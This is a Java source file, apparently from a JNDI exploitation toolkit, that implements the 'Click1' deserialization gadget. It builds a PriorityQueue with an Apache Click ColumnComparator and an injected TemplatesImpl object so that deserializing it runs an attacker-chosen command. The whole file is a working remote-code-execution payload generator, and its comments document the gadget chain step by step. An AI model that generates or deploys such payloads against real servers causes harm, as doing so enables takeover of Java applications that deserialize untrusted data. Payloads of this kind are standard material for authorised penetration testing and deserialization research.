package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.click.control.Column;
import org.apache.click.control.Table;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;



/**
 * Apache Click chain based on arbitrary getter calls in PropertyUtils.getObjectPropertyValue().
 * We use java.util.PriorityQueue to trigger ColumnComparator.compare().
 * After that, ColumnComparator.compare() leads to TemplatesImpl.getOutputProperties() via unsafe reflection.
 * <p>
 * Chain:
 * <p>
 * java.util.PriorityQueue.readObject()
 * java.util.PriorityQueue.heapify()
 * java.util.PriorityQueue.siftDown()
 * java.util.PriorityQueue.siftDownUsingComparator()
 * org.apache.click.control.Column$ColumnComparator.compare()
 * org.apache.click.control.Column.getProperty()
 * org.apache.click.control.Column.getProperty()
 * org.apache.click.util.PropertyUtils.getValue()
 * org.apache.click.util.PropertyUtils.getObjectPropertyValue()
 * java.lang.reflect.Method.invoke()
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
 * ...
 * <p>
 * Arguments:
 * - command to execute
 * <p>
 * Yields:
 * - RCE via TemplatesImpl.getOutputProperties()
 * <p>
 * Requires:
 * - Apache Click
 * - servlet-api of any version
 * <p>
 * by @artsploit
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
@Authors({Authors.ARTSPLOIT})
public class Click1 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        // prepare a Column.comparator with mock values
        final Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);

        // create queue with numbers and our comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by the comparator,
        // so it will trigger getOutputProperties() when objects in the queue are compared
        column.setName("outputProperties");

        // finally, we inject and new TemplatesImpl object into the queue,
        // so its getOutputProperties() method will be called
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        final Object template;
        template = Gadgets.createTemplatesImpl(command);
        queueArray[0] = template;
        return queue;
    }

}
